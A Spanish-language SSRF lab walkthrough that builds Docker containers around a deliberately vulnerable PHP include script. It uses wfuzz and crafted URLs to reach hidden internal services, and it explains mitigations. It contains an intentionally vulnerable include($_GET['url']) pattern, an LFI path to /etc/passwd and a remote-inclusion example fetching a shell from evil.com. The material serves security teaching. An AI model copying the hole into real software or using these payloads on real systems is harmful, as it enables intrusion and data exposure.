
---

**OWASP:** Server-Side  Request Forgery (SSRF)

**Plataforma:** Hack4u.io

**Laboratorio:** docker
 

---
# Laboratorio SSRF con Docker: Guía Paso a Paso

## Paso 1 - construcción de laboratorio Docker

Acción: 

```Shell
docker pull ubuntu:latest
docker images
```

Acción:

```Shell
docker run -dit --name ssrf_first_lab ubuntu
dcoker ps
```

Acción: 

```Shell
docker exec -it ssrf_first_lab bash
```

Explicación: montamos un primer contenedor el cual ejecutamos con una bash para terminar de configurar

## Paso 2 - configuración de primer contenedor

Acción: 

```Shell
apt update
apt install apache2 php nano python3 -y
```

Acción:

```Shell
service apache2 start
```


Acción: 

```Shell
lsof -i:80
```

Resultado:

```Shell
COMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
apache2 9907 root    3u  IPv4  57351      0t0  TCP *:http (LISTEN)
```

Explicación: primeros pasos de la configuración del laboratorio, donde ahora podemos acceder a localhost y ver en nuestro navegador el servicio de apache


Acción: 

```Shell
cat /proc/net/fib_trie
```

Resultado: 

```Shell
...
              /16 link UNICAST
           |-- 172.17.0.2
              /32 host LOCAL
        |-- 172.17.255.255
           /32 link BROADCAST
```

Acción: 

```Shell
cd /var/www/html
rm index.html
nano utility.php
```

```lua
<?php
	if(isset($_GET['url'])){
		$url = $_GET['url'];
		echo "\n[+] Listando el contenido de la web " . $url . ":\n\n";
		include($url);
	} else {
		echo "\n[!] No se ha introducido valor para el parametro URL\n\n";
	}
?>
```
### Explicación del código php


#### Análisis de vulnerabilidad en código PHP – `include($_GET['url'])`

Este archivo analiza un fragmento de código PHP vulnerable a **File Inclusion**, una falla crítica desde el punto de vista de la seguridad web.

---

#### Código analizado

```php
<?php
	if(isset($_GET['url'])){
		$url = $_GET['url'];
		echo "\n[+] Listando el contenido de la web " . $url . ":\n\n";
		include($url);
	} else {
		echo "\n[!] No se ha introducido valor para el parametro URL\n\n";
	}
?>
````

---

#### ¿Qué hace este código?

1. Comprueba si el parámetro `url` ha sido proporcionado por la URL (mediante `GET`).
2. Si existe, incluye ese archivo con `include($url)` y lo ejecuta como código PHP.
3. Si no se proporciona, muestra un mensaje de error.

---

#### Explicación línea por línea

| Línea                      | Descripción                                                |
| -------------------------- | ---------------------------------------------------------- |
| `<?php`                    | Inicio del código PHP.                                     |
| `if(isset($_GET['url'])){` | Verifica si se ha enviado el parámetro `url`.              |
| `$url = $_GET['url'];`     | Almacena el valor del parámetro en una variable.           |
| `echo "...";`              | Muestra un mensaje indicando qué archivo se está listando. |
| `include($url);`           | Incluye y ejecuta el archivo indicado por el usuario.   |
| `} else {`                 | Si no se proporciona el parámetro.                         |
| `echo "...";`              | Muestra mensaje de error.                                  |
| `}`                        | Cierre del bloque `if`.                                    |
| `?>`                       | Fin del bloque PHP.                                        |

---

Aquí tienes el contenido listo para guardar como archivo `.md`, adaptado completamente al contexto de SSRF en tu laboratorio de Docker:

---


#### ¿Qué hace este código?

* Verifica si se ha recibido el parámetro `url` por GET.
* Si existe, se guarda en `$url` y se usa en `include($url)`.
* Esto incluye (y ejecuta) el contenido del archivo o URL especificado.

---

#### ¿Por qué es una SSRF?

> En este contexto, **el atacante no está incluyendo archivos locales**, sino forzando al servidor a hacer una petición HTTP hacia una URL que él elige.

##### SSRF = el servidor actúa como cliente HTTP

Ejemplo de uso malicioso:

```
http://localhost/utility.php?url=http://127.0.0.1:8000/privado
```

* El servidor **hace una petición a localhost:8000**.
* El atacante puede acceder a recursos internos no expuestos al exterior.

---

Probar explotación SSRF:

   * Ejecutar un servidor en segundo plano dentro del contenedor:

     ```bash
     python3 -m http.server 8000
     ```

   * Luego desde el navegador:

     ```
     http://localhost/utility.php?url=http://127.0.0.1:8000
     ```

   * Resultado: el script PHP hace una petición a `127.0.0.1:8000`, revelando contenido.

---

#### Riesgos potenciales

* Enumerar servicios internos (`http://127.0.0.1:8080`, etc.).
* Acceso a metadatos de infraestructura cloud (por ejemplo, AWS: `http://169.254.169.254`).
* Acceder a paneles de administración internos no expuestos.
* Si se combina con `include` y `allow_url_include = On`, puede haber **ejecución remota de código (RCE)**.

---

#### Mitigaciones recomendadas

1. **No incluir contenido externo sin validación.**
2. Desactivar en `php.ini`:

```ini
   allow_url_include = Off
   allow_url_fopen = Off
```

3. Validar el parámetro `url` contra una lista blanca.
4. Evitar usar `include()` con contenido no local.
5. Si necesitas obtener contenido remoto, usar `curl` o `file_get_contents`, con validaciones estrictas.

---

#### Alternativa segura

```php
<?php
$permitidos = ['pagina1.php', 'pagina2.php'];

if (isset($_GET['url']) && in_array($_GET['url'], $permitidos)) {
	include($_GET['url']);
} else {
	echo "URL no permitida.";
}
?>
```

---

#### Conclusión

Este laboratorio demuestra cómo un simple uso de `include($_GET['url'])` puede derivar en un **ataque SSRF**, permitiendo al atacante interactuar con recursos internos y potencialmente tomar control del sistema.

---


#### Vulnerabilidad: Inclusión de archivos

Este código es vulnerable a una **File Inclusion Vulnerability**, que puede ser:

### 1. LFI (Local File Inclusion)

Permite incluir archivos locales del sistema.

**Ejemplo:**

```
http://example.com/script.php?url=../../../../etc/passwd
```

### 2. RFI (Remote File Inclusion)

Si la directiva `allow_url_include` está activada en `php.ini`, se pueden incluir archivos remotos.

**Ejemplo:**

```
http://example.com/script.php?url=http://evil.com/shell.php
```

Esto puede conducir a una **RCE (Remote Code Execution)**.

---

#### Mitigación recomendada

* **No incluir archivos directamente desde `$_GET`.**
* Validar los archivos permitidos usando listas blancas.
* Desactivar `allow_url_include` en `php.ini`.
* Usar rutas absolutas seguras o funciones como `basename()` para validar.

---

#### Código corregido con whitelist

```php
<?php
$permitidos = ['inicio.php', 'contacto.php'];

if (isset($_GET['url']) && in_array($_GET['url'], $permitidos)) {
	include($_GET['url']);
} else {
	echo "Archivo no permitido.";
}
?>
```

---

#### Nota final

Este tipo de vulnerabilidades son **frecuentes en aplicaciones web antiguas o mal diseñadas**. Son objetivos comunes en entornos de pentesting, como CTFs o laboratorios tipo Hack The Box.

---


## Paso 3 - probando la vulnerabilidad SSRF

Acción: 

```url 
http://172.17.0.2/utility.php
```

Resultado:

```html
[!] No se ha introducido valor para el parametro URL 
```


Acción: 

```url
http://172.17.0.2/utility.php?url=https://google.es
```

Resultado:

```html
[+] Listando el contenido de la web https://google.es: 
```

Explicación: 

## Paso 7 -

Acción: 

```Shell
find / -name php.ini 2>/dev/null

```

Resultado:

```Shell
/etc/php/8.3/cli/php.ini
/etc/php/8.3/apache2/php.ini
```

Explicación: modificamos este archivo `/etc/php/8.3/apache2/php.ini` para poner el modo 'allow_url_include' en 'On' y poder redireccionar la url desde el navegador 

## Paso 8 -

Acción: 

```Shell
nano /etc/php/8.3/apache2/php.ini
service apache2 restart
```

Resultado:

```Shell
; Whether to allow include/require to open URLs (like https:// or ftp://) as files.
; https://php.net/allow-url-include
allow_url_include = On
```

Explicación: de este modo podemos resolver los redireccionamientos

## Paso 9 -

Acción: 

```Shell
nano loging.html
nano login.css
```

Resultado: login.html

```lua
<!DOCTYPE html>
<html>

<head>
    <title>HTML Login Form</title>
    <link rel="stylesheet" href="login.css">
</head>

<body>
    <div class="main">
        <h1>GeeksforGeeks</h1>
        <h3>Enter your login credentials</h3>

        <form action="">
            <label for="first">
                Username:
            </label>
            <input type="text" id="first" name="first" 
                placeholder="Enter your Username" required>

            <label for="password">
                Password:
            </label>
            <input type="password" id="password" name="password" 
                placeholder="Enter your Password" required>

            <div class="wrap">
                <button type="submit">
                    Submit
                </button>
            </div>
        </form>
        
        <p>Not registered?
            <a href="#" style="text-decoration: none;">
                Create an account
            </a>
        </p>
    </div>
</body>

</html>
```

Resultado: login.css 

```lua
/*style.css*/
body {
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: sans-serif;
    line-height: 1.5;
    min-height: 100vh;
    background: #f3f3f3;
    flex-direction: column;
    margin: 0;
}

.main {
    background-color: #fff;
    border-radius: 15px;
    box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
    padding: 10px 20px;
    transition: transform 0.2s;
    width: 500px;
    text-align: center;
}

h1 {
    color: #4CAF50;
}

label {
    display: block;
    width: 100%;
    margin-top: 10px;
    margin-bottom: 5px;
    text-align: left;
    color: #555;
    font-weight: bold;
}

input {
    display: block;
    width: 100%;
    margin-bottom: 15px;
    padding: 10px;
    box-sizing: border-box;
    border: 1px solid #ddd;
    border-radius: 5px;
}

button {
    padding: 15px;
    border-radius: 10px;
    margin-top: 15px;
    margin-bottom: 15px;
    border: none;
    color: white;
    cursor: pointer;
    background-color: #4CAF50;
    width: 100%;
    font-size: 16px;
}

.wrap {
    display: flex;
    justify-content: center;
    align-items: center;
}
``` 

## Paso 10 -

Acción: 

```url
http://172.17.0.2/login.html
```

Resultado:

```Shell
Vemos el panel de login creado
```

Explicación: hemos creado un panel de login (en Producción)


## Paso 11 -

Acción: vamos a crear un panel de login para Preproducción

```Shell
cp login.html login.css /tmp/
cd !$
nano login.html 
```

**Nota:** en `login.html` lo que hacemos es poner un apartado de (PRE) donde indiquemos unas credenciales de testeo, a su vez usaremos `--bind` para no exponer el entorno de Preproducción al público

Resultado:

```lua
        <h1>GeeksforGeeks(PRE)</h1>
        <h3>Enter your login credentials</h3>
	<label>// * Testear con las credenciales administrator/adm1n$13_2023 (mismas que las de produccion) </label><br><br>
        <form action="">
            <label for="first">
                Username:
```

Acción:  

```Shell
python3 -m http.server 4646 --bind 127.0.0.1
```

Explicación: con esta configuración solo podemos acceder al servicio de preproducción desde la propia máquina que corre dicho servicio, por lo que no es accesible ni visible desde fuera. Aquí empieza el ejemplo de SSRF


## Paso 12 -

Acción: 

```url
http://172.17.0.2/utility.php?url=http://127.0.0.1
```


Explicación: desde fuera no podemos acceder al servicio de PRE, pero como es la propia máquina la que se apunta a si misma si podemos verlo, es decir, desde la url estamos apuntando a una direción interna del propio servidor. La clave esta es saber por que peurto esta corriendo dicho servicio PRE, para ello aplicamos fuzzing con WFUZZ

## Paso 13 -

Acción: 

```Shell
wfuzz -c -t 100 --hl=3 -z range,1-65535 "http://172.17.0.2/utility.php?url=http://127.0.0.1:FUZZ"
```

Resultado:

```Shell
000000080:   200        20 L     77 W       1207 Ch     "80"                                                                                  
000004646:   200        19 L     35 W       336 Ch      "4646"
```

Explicación: vemos que tenemos dos puertos operativos, el 80 es el de PRO que ya teniamos acceso y era visible por ejemplo con nmap, pero ahora vemos el 4646, por lo que podemos tratar de acceder a este entorno


## Paso 14 -

Acción: 

```url
http://172.17.0.2/utility.php?url=http://127.0.0.1:4646/login.html
```


Explicación: de este modo, apuntando directamente al recurso que vemos en `http://172.17.0.2/utility.php?url=http://127.0.0.1:4646` podemos acceder al entorno de PRE

---

# Ejemplo de SSRF con red aislada

## Paso 1 -

Acción: 

```Shell
docker network create --driver=bridge nework1 --subnet=10.10.0.0/24
```

Explicación: 

### Crear una red en Docker con `docker network create`

Este comando permite crear una red personalizada para que los contenedores Docker se comuniquen entre sí, con una configuración definida por el usuario.

---

### Comando completo

```bash
docker network create --driver=bridge nework1 --subnet=10.10.0.0/24
````

---

### Explicación de cada parte

| Parte del comando       | Explicación                                                                                                                                               |
| ----------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `docker network create` | Comando base para crear una red en Docker.                                                                                                                |
| `--driver=bridge`       | Define el tipo de red. `bridge` es el tipo por defecto y se usa para crear una red virtual privada donde los contenedores pueden comunicarse entre ellos. |
| `nework1`               | Es el nombre que le damos a la red. Puedes usar cualquier nombre (ej. `red_interna`, `mi_red`, etc.).                                                     |
| `--subnet=10.10.0.0/24` | Especifica el rango de direcciones IP para la red. En este caso, se permite un total de 254 hosts (de 10.10.0.1 a 10.10.0.254).                           |

---

### ¿Para qué sirve esto?

* Crear redes personalizadas te permite **aislar contenedores**, simulando entornos reales.
* Puedes asignar IPs fijas dentro de esa subred si lo necesitas.
* Útil en laboratorios de ciberseguridad, entornos de pruebas, simulación de servidores, etc.

---

### Ejemplo práctico

Supongamos que quieres levantar dos contenedores que se comuniquen entre sí:

```bash
docker network create --driver=bridge red_lab --subnet=192.168.100.0/24

docker run -dit --name debian1 --net red_lab --ip 192.168.100.10 debian
docker run -dit --name debian2 --net red_lab --ip 192.168.100.20 debian
```

Ahora puedes hacer ping de un contenedor al otro con sus IPs fijas.

---

### Ver redes creadas

```bash
docker network ls
```

### Ver detalles de una red

```bash
docker network inspect nework1
```

---

### Eliminar la red

```bash
docker network rm nework1
```

> Solo puedes eliminar una red si **no hay contenedores conectados a ella**.

---

### Nota sobre errores comunes

* Si aparece un error como `invalid CIDR address`, asegúrate de que el formato de la subred esté correcto (ej: `10.10.0.0/24`).
* Si el nombre `nework1` ya existe, debes usar otro nombre o eliminar el anterior.

---



## Paso 2 -

Acción: vamos a desplegar 3 contenedores (atacante, entorno de PRO y entorno de PRE)

```Shell
docker run -dit --name PRO ubuntu
hostname -I
```

Resultado:

```Shell
172.17.0.2 
```
Acción: configuramos un contenedor con dos IP una visible y otra para poder comunicarse con el entorno PRE

```Shell
docker network connect nework1 PRO
docker exec -it PRO bash
hostname -I
```

Resultado:

```Shell
172.17.0.2 10.10.0.2 
```

Explicación: ahora esta máquina tiene dos direcciones IP 

**Nota:** con `ip a` vemos que tenemos dos interfaces de red 'eth0' y 'eth1' cada una con una IP diferente

```bash 
apt update
apt intall iproute2
ip a
```

Resultado:

```bash
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
8: eth0@if9: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
10: eth1@if11: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:0a:0a:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.10.0.2/24 brd 10.10.0.255 scope global eth1
       valid_lft forever preferred_lft forever
```

Acción: configuramos el segundo contenedor que aloja el entorno de PRE, con la misma subred que el anterior para que haya comunicación entre ambos

```Shell
docker run -dit --name PRE --network=nework1 ubuntu
docker exec -it PRE bash
hostname -I 
```
Resultado:

```Shell
10.10.0.3
```

Acción: 

```Shell
docker run -dit --name ATTACKER ubuntu
docker exec -it ATTACKER bash 
hostname -I 
```

Resultado:

```Shell
172.17.0.3
```
Explicación: hemos configurado 3 contenedores, dos de elo con conexión entre ellas ya que estan en la misma subred, la otra es la atacante y tendra que ganar acceso a una de ellas (a la de PRO) para poder desde ahí comunicarse con la que se encuentra en PRE 

```css 
[ATTACKER] --172.17.0.3          10.10.0.2-- [PRO]
                                      \
                                       \--10.10.0.3-- [PRE]
```

## Paso 3 -

Acción: 

```Shell
service apache2 start 
cd /var/www/html
rm index.html
nano utility.php
```

Acción: utility.php

```lua
<?php
	include($_GET['url']);
?>
```


Acción: 

```Shell
find / -name php.ini 2>/dev/null
```

Resultado:

```Shell
/etc/php/8.3/cli/php.ini
/etc/php/8.3/apache2/php.ini
```


Acción: 

```Shell
nano /etc/php/8.3/apache2/php.ini
service apache2 restart 
```

Resultado:

```Shell
allow_url_include = On
```


## Paso 4 -

Acción: entorno PRE 

```Shell
index.html 
python3 -m http.server 7878
```

Acción: index.html 

```lua 
Este contenido no deberia de ser visible para el exterior, dado que corresponde a un servicio web de una red interna de la empresa
```


## Paso 5 -

Acción: contenedor atacante (ATTACKER)

```Shell
curl "http://172.17.0.2/utility.php?url=http://10.10.0.3:7878/"
```

Resultado:

```Shell
Este contenido no deberia de ser visible para el exterior, dado que corresponde a un servicio web de una red interna de la empresa
```

Explicación: de esta forma hemos podido explotar un SSRF, de forma que detectando esta vulnerabilidad en la máquina de PRO, hemos podido apuntar a una red interna de su propia máquina, para comunicarnos con una subred y mostrar contenido que no esta expuesto al exterior, solo desde el interior de la máquina

---
